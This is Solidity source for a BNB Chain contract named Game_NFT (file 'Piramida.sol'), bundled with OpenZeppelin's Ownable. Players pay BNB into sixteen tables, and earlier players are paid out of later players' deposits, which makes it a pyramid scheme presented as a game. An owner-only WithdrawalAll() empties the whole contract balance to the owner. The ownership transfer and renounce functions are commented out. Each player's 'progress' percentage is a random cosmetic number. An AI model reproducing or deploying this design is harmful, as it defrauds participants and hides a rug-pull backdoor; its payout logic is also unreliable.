/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// File: @openzeppelin/[email protected]/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/[email protected]/access/Ownable.sol


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
     
    //function renounceOwnership() public virtual onlyOwner {
    //    _transferOwnership(address(0));
    //}

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
   // function transferOwnership(address newOwner) public virtual onlyOwner {
   //     require(newOwner != address(0), "Ownable: new owner is the zero address");
   //     _transferOwnership(newOwner);
   // }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: Piramida.sol



pragma solidity ^0.8.15;


contract Game_NFT is Ownable {

    uint256 min_price = 0.01 ether;
    mapping(address => uint256) id;
    mapping(uint256 => address) adr_id;

    uint256 id_count;

     mapping(address => uint256) allZarabotok;
     mapping(address => uint256) Ref_Zarabotok;

    struct Tables{
       address[] adr_pool;
       uint256 count;
       mapping(address => uint256) progress_game_percent;
       mapping(address => bool) in_game;
       mapping(address => uint256) zarabotok;

      mapping(address => uint256) time_reward;

      mapping(address => uint256) time_buyTable;
    }

    mapping(address => uint256[]) All_zarabotok;
    mapping(address => uint256[]) ALL_time_reward;

    Tables[] public all_tables;

    mapping (address => address)    my_inviter;
    mapping (address => uint256)    invite_time;
    mapping (address => address[3])  my_referrals;

    mapping (address => uint256) time_registration;

    uint256 time_now;

    mapping (address => uint256[]) kol_vivod;
    mapping (address => uint256[]) time_vivod;

    mapping (address => uint256[]) list_time_buy_plan;

    mapping(address => mapping(uint256 => uint256[])) date_buy_table;

    uint256 public referal_cost = 0.005 * 10 ** 18; //скольк оотчисляют рефералы

    constructor() {

        Tables storage new_table = all_tables.push();
        Tables storage new_table1 = all_tables.push();
        Tables storage new_table2 = all_tables.push();
        Tables storage new_table3 = all_tables.push();
        Tables storage new_table4 = all_tables.push();
        Tables storage new_table5 = all_tables.push();
        Tables storage new_table6 = all_tables.push();
        Tables storage new_table7 = all_tables.push();
        Tables storage new_table8 = all_tables.push();
        Tables storage new_table9 = all_tables.push();
        Tables storage new_table10 = all_tables.push();
        Tables storage new_table11 = all_tables.push();
        Tables storage new_table12 = all_tables.push();
        Tables storage new_table13 = all_tables.push();
        Tables storage new_table14 = all_tables.push();
        Tables storage new_table15 = all_tables.push();
        Tables storage new_table16 = all_tables.push();

        id_count++;
        time_now = block.timestamp;
        list_time_buy_plan[msg.sender].push(block.timestamp);
    }

    function StartGame(uint256 number_table) public payable { ///////////////5 метод
        require(msg.value == min_price*(number_table+1), "Not enough BNB provided");
        require(all_tables[number_table].in_game[msg.sender] == false, "You in game");
        require(id[msg.sender] > 0, "Not set ID");

        require(Check_Open_Plan()[number_table] == true, "Table closed");

        if (all_tables[number_table].adr_pool.length > 0){

            //второй заход в игру

            if (all_tables[number_table].zarabotok[all_tables[number_table].adr_pool[all_tables[number_table].count]] > 0){
               
               

                // all_tables[number_table].adr_pool[all_tables[number_table].count] - последний номер в списке

                if(my_inviter[all_tables[number_table].adr_pool[all_tables[number_table].count]] != address(0)){
                     all_tables[number_table].zarabotok[all_tables[number_table].adr_pool[all_tables[number_table].count]] += min_price*(number_table+1) - referal_cost;
                      payable(all_tables[number_table].adr_pool[all_tables[number_table].count]).transfer(min_price*(number_table+1)+referal_cost); 
                }
                else {
                     all_tables[number_table].zarabotok[all_tables[number_table].adr_pool[all_tables[number_table].count]] += min_price*(number_table+1);
                      payable(all_tables[number_table].adr_pool[all_tables[number_table].count]).transfer(min_price*(number_table+1)); 
                }
               
                all_tables[number_table].in_game[all_tables[number_table].adr_pool[all_tables[number_table].count]] = false;
                all_tables[number_table].time_reward[all_tables[number_table].adr_pool[all_tables[number_table].count]] = block.timestamp;

                All_zarabotok[all_tables[number_table].adr_pool[all_tables[number_table].count]].push(min_price*(number_table+1));
                ALL_time_reward[all_tables[number_table].adr_pool[all_tables[number_table].count]].push(block.timestamp);

                allZarabotok[msg.sender] += min_price*(number_table+1);
                all_tables[number_table].count++;

                

                 
            }

            //первый заход

            else{
                 
               
                 all_tables[number_table].zarabotok[all_tables[number_table].adr_pool[all_tables[number_table].count]] += min_price*(number_table+1);
                 if (my_inviter[msg.sender] != address(0)){
                     all_tables[number_table].zarabotok[my_inviter[msg.sender]] += referal_cost;
                     Ref_Zarabotok[my_inviter[msg.sender]] += referal_cost;
                     //all_tables[number_table].zarabotok[msg.sender] -= referal_cost;
                 }
            }
               
                
           
        }
        
        date_buy_table[msg.sender][number_table].push(block.timestamp);
        list_time_buy_plan[msg.sender].push(block.timestamp);
        all_tables[number_table].time_buyTable[msg.sender] = block.timestamp;
        all_tables[number_table].adr_pool.push(msg.sender);
        all_tables[number_table].in_game[msg.sender] = true;
        all_tables[number_table].progress_game_percent[msg.sender] = random(88)+12;

    }

    function Check_Date_Buy_Table(address adr, uint256 number_table) public view returns(uint256[] memory){
        return date_buy_table[adr][number_table];
    }

    function Check_ID(address adr) public view returns(uint256) {
       return id[adr];
    }

    function Check_Time_Buy_Plan(address adr) public view returns(uint256[] memory){
        return list_time_buy_plan[adr];
    }

    function Check_RefZarabotok(address adr) public view returns(uint256) {
       return Ref_Zarabotok[adr];
    }

    function Check_ID_Adress(uint256 _id) public view returns(address) {
       return adr_id[_id];
    }

    function Check_Progress(uint256 number_table, address adr) public view returns(uint256) {
       return all_tables[number_table].progress_game_percent[adr];
    }

    function Check_InGame(uint256 number_table, address adr) public view returns(bool) {
       return all_tables[number_table].in_game[adr];
    }

    function Check_Zarabotok(uint256 number_table, address adr) public view returns(uint256) {
       return all_tables[number_table].zarabotok[adr];
    }

    function Check_CostTable(uint256 number_table) public view returns(uint256){
       return min_price*(number_table+1);
    }

    function Collect_payment(uint256 number_table) public{ 
        if (all_tables[number_table].zarabotok[msg.sender] == (min_price*(number_table+1))*2){
            payable(msg.sender).transfer(min_price*(number_table+1));
            
            all_tables[number_table].time_reward[msg.sender] = 0;
            all_tables[number_table].zarabotok[msg.sender] = 0;
            all_tables[number_table].in_game[msg.sender] = false;
            all_tables[number_table].progress_game_percent[msg.sender] = 0;

            kol_vivod[msg.sender].push(min_price*(number_table+1));
            time_vivod[msg.sender].push(block.timestamp);
        }
        else
        revert("insufficient funds");
    }

    function Cheker_Balance() public view returns(uint256) {
        return address(this).balance;
    }

    function WithdrawalAll() public onlyOwner {
      payable(msg.sender).transfer(address(this).balance);
    }

     function random(uint number) public view returns(uint){
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
        msg.sender))) % number;
    }

    function Add_Inviter(address inviter) public{   //////////////////////////1 метод
        Reg_Time();

        if(my_inviter[inviter] == address(0) && inviter != msg.sender){
        my_inviter[inviter] = msg.sender;
        invite_time[msg.sender] = block.timestamp;
        
        if (my_referrals[msg.sender][0] == address(0))
        my_referrals[msg.sender][0] = inviter;
        else if (my_referrals[msg.sender][1] == address(0))
        my_referrals[msg.sender][1] = inviter;
        else if (my_referrals[msg.sender][2] == address(0))
        my_referrals[msg.sender][2] = inviter;

        }
       
        
        

      if(adr_id[id_count] == address(0)){
        adr_id[id_count] = msg.sender;
        id[msg.sender] = id_count;
        id_count++;
      }
    }


        ////////////2 метод//////////
   /* function Invite_Zarabotok(address adr) public view returns (address[] memory){ 
       
       address[] memory adr1;

       for(uint i = 0; i < my_referrals[adr].length; i++) {
           
       }
     
       return my_referrals[adr];


    }
    */
    
    ////////////////3 метод///////////////
    function Check_AllZarabotok(address adr) public view returns(uint256) {
       return allZarabotok[adr];
    }

     function Check_MyInviter(address adr) public view returns (address){
        return my_inviter[adr];
    }

    function Check_MyReferals(address adr) public view returns (address[3] memory){
        return my_referrals[adr];
    }

     function Check_Count_MyReferals(address adr) public view returns(uint256){
        return my_referrals[adr].length;
    }

    function Check_PlansBuy(address adr) public view returns(bool[16] memory){ /////////4 метод
        
        bool[16] memory arr;
      
        for(uint i = 0; i < all_tables.length-1; i++) {
            arr[i] = all_tables[i].in_game[adr];
        }

        return arr;
     
    }

    /////////6 метод////////
    function Check_PlansZarabotok(address adr) public view returns(uint256[16] memory, uint256[16] memory){
         uint256[16] memory _zarabotok;
         uint256[16] memory _time;

        for(uint i = 0; i < all_tables.length-1; i++) {
            _zarabotok[i] = all_tables[i].zarabotok[adr];
            if(all_tables[i].time_buyTable[adr] > all_tables[i].time_reward[adr])
            _time[i] = all_tables[i].time_reward[adr];
            else
            _time[i] = all_tables[i].time_buyTable[adr];
        }

        return (_zarabotok, _time);

    }
    
    ////7 метод//////
    function Check_Time() public view returns(uint256[16] memory){
         
         uint256[16] memory _time;

        for(uint i = 0; i < all_tables.length-1; i++) {
            _time[i] = (time_now + 86400)*i;
        }

        return _time;

    }

    ////8 метод////
    function Reg_Time() public{
        if(time_registration[msg.sender] == 0)
        time_registration[msg.sender] = block.timestamp;
    }

    ///8.2 метод
    function Check_Reg_Time(address adr) public view returns(uint256){
        return time_registration[adr];
    }

    /////9 метод////
    function Check_VivodBNB(address adr) public view returns(uint256[] memory, uint256[] memory){
        return (kol_vivod[adr],time_vivod[adr]);
    }

    function Set_ID() public{
        require(id[msg.sender] == 0, "ID set");
        Reg_Time();
        require(adr_id[id_count] == address(0), "ID set");
        adr_id[id_count] = msg.sender;
        id[msg.sender] = id_count;
        id_count++;
    }

    function Check_Open_Plan() public view returns(bool[16] memory){ 

        uint256[16] memory _time;
         bool[16] memory open;
      
       for(uint i = 0; i < all_tables.length-1; i++) {
            _time[i] = (time_now + 86400)*i;
        }

         for(uint i = 0; i < all_tables.length-1; i++) {
             if (_time[i] >= block.timestamp)
             open[i] = false;
             else
              open[i] = true;
         }

         return open;
    }



    function CCCCC() public view returns(address){
        return adr_id[id_count];
    }
    

}